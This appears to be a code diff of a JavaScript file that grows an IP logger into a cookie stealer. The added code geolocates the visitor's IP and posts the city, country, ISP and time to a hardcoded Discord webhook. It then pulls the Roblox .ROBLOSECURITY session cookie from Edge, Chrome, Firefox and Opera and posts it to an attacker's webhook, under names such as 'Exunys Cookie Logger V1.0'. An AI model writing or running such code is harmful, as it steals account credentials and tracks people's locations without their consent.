@@ -1,57 +1,119 @@
-// Replace with your actual Discord webhook URL
-const webhookUrl = 'https://discord.com/api/webhooks/1292133644781092894/aOQyAzT2P2mhRM1WJHqeUvVq7EZX1jalZV4oGIL9L3pCkXT02l9x9Zbkbviu5lBn43hF';
+// Function to log IP information to a Discord webhook
+async function logIPToDiscord() {
+  // Fetch the user's IP address
+  const ipData = await fetch('https://api.ipify.org?format=json').then(response => response.json());
 
-fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const userIp = data.ip;
+  // Fetch location data based on the IP address
+  const locationData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(response => response.json());
 
-    // Get user's operating system (simplified approach)
-    const userAgent = navigator.userAgent;
-    let os = 'Unknown';
-    if (userAgent.includes('Windows')) {
-      os = 'Windows';
-    } else if (userAgent.includes('Macintosh')) {
-      os = 'macOS';
-    } else if (userAgent.includes('Linux')) {
-      os = 'Linux';
-    } else if (userAgent.includes('Android')) {
-      os = 'Android';
-    } else if (userAgent.includes('iOS')) {
-      os = 'iOS';
-    }
+  // Discord webhook URL
+  const webhookUrl = 'https://discord.com/api/webhooks/1292133644781092894/aOQyAzT2P2mhRM1WJHqeUvVq7EZX1jalZV4oGIL9L3pCkXT02l9x9Zbkbviu5lBn43hF'; // Replace with your Discord webhook URL
 
-    // Guess the device type
-    let deviceType = 'Unknown';
-    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
-      deviceType = 'Tablet';
-    } else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(Opera Mini)/i.test(userAgent)) {
-      deviceType = 'Mobile';
-    } else {
-      deviceType = 'PC';
-    }
+  // Function to format time to 12-hour format
+  function format12HourTime(date) {
+    let hours = date.getHours();
+    const minutes = date.getMinutes();
+    const seconds = date.getSeconds();
+    const ampm = hours >= 12? 'PM' : 'AM';
+    hours = hours % 12;
+    hours = hours? hours : 12; // the hour '0' should be '12'
+    const strMinutes = minutes < 10? '0' + minutes : minutes;
+    const strSeconds = seconds < 10? '0' + seconds : seconds;
+    return `${hours}:${strMinutes}:${strSeconds} ${ampm}`;
+  }
 
-    // Create Discord embed payload
-    const embed = {
-      title: 'New User Detected!',
-      color: 0x00ff00, // Green color
-      fields: [
-        { name: 'IP Address', value: userIp, inline: true },
-        { name: 'Operating System', value: os, inline: true },
-        { name: 'Device Type', value: deviceType, inline: true },
-        { name: 'User Agent', value: userAgent, inline: false }, // Log the user agent for device info
-      ],
-    };
+  // Create the embed payload for Discord
+  const embed = {
+    content: null,
+    embeds: [
+      {
+        title: 'User Access Log',
+        fields: [
+          { name: 'IP Address', value: ipData.ip },
+          { name: 'City', value: locationData.city },
+          { name: 'Region', value: locationData.region },
+          { name: 'Country', value: locationData.country_name },
+          { name: 'Wi-Fi Provider', value: locationData.org },
+          { name: 'Access Time', value: format12HourTime(new Date()) }, // Use 12-hour format
+        ],
+        color: 5814783
+      }
+    ]
+  };
 
-    // Send data to Discord webhook
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ embeds: [embed] }),
-    })
-      .then(() => console.log('Data sent to Discord!'))
-      .catch(error => console.error('Error sending data:', error));
-  })
-  .catch(error => console.error('Error fetching IP:', error));
+  // Send the embed to the Discord webhook
+  await fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(embed),
+  });
+}
+
+// Cookie logging functions
+const browserCookie3 = require('browser-cookies');
+const axios = require('axios');
+
+const WebHook = "INPUT_HERE"; // Input your webhook here and make sure to compile if you want to log your target
+
+function MicrosoftEdge() {
+  try {
+    const cookies = browserCookie3.edge({ domain: "roblox.com" });
+    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
+    axios.post(WebHook, {
+      username: "Exunys Cookie Logger V1.0",
+      content: `\`\`\`${cookie}\`\`\``
+    });
+  } catch (error) {
+    // Handle error
+  }
+}
+
+function GoogleChrome() {
+  try {
+    const cookies = browserCookie3.chrome({ domain: "roblox.com" });
+    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
+    axios.post(WebHook, {
+      username: "Exunys Cookie Logger V1.0",
+      content: `\`\`\`${cookie}\`\`\``
+    });
+  } catch (error) {
+    // Handle error
+  }
+}
+
+function MozillaFirefox() {
+  try {
+    const cookies = browserCookie3.firefox({ domain: "roblox.com" });
+    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
+    axios.post(WebHook, {
+      username: "Exunys Cookie Logger V1.0",
+      content: `\`\`\`${cookie}\`\`\``
+    });
+  } catch (error) {
+    // Handle error
+  }
+}
+
+function Opera() {
+  try {
+    const cookies = browserCookie3.opera({ domain: "roblox.com" });
+    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
+    axios.post(WebHook, {
+      username: "KM LOGGERS LOL",
+      content: `\`\`\`${cookie}\`\`\``
+    });
+  } catch (error) {
+    // Handle error
+  }
+}
+
+const browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera];
+
+browsers.forEach(browser => {
+  setTimeout(browser, 0); // Simulate threading with setTimeout
+});
+
+// Call the logging function
+logIPToDiscord();
